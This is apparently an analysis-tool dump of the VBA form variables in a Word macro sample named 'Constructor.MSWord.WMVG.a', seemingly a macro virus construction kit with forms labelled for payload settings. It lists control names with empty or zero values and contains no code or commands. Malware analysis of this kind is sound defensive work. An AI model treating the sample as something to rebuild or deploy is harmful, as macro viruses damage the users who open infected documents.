VBA FORM Variable "b'Frame4'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame7'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton73'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton74'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton75'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton76'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame11'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame16'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame17'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame18'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame19'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton1'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton2'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton48'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i111'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton49'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i111'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton44'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i111'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton45'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i111'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton5'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i12'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton5'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i12'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton6'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i12'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton6'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i12'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton58'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i144'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton62'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i144'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton63'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i144'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton59'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i144'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton60'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i144'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton65'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i144'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton72'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i144'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton79'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i144'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i163'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i163'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox2'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i163'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i163'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox3'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i163'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i163'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton9'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton9'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton10'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton10'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton11'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton11'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton12'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton12'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton14'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton15'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton14'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton15'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton17'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton13'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton13'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton19'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton67'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton80'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton81'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton65'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i226'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton77'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i226'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton78'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i226'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton66'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i226'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox1'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i235'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton83'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i235'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox2'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i245'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton82'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i245'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton32'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i74'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton33'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i74'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton29'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i74'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton28'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i74'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGAbout'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGAbout'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame2'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame3'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton13'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image2'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i09'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i09'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton3'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i09'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton5'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i09'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton6'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i09'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton7'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i09'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton8'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i09'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton4'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i09'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i17'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i17'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i17'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i17'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i17'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label6'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i17'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label7'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i17'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton9'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i26'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton10'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i26'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton11'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i26'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton75'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame2'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton74'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/i19'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame2'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton12'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i132'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton10'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i132'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton1'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i132'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton2'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i132'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton3'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i132'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton4'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i132'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton5'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i132'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton6'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i132'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton7'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i132'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton8'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i132'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton11'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i132'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton13'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i132'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton48'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i132'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton14'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton15'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton16'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton17'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton18'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton19'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton20'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton21'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton22'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
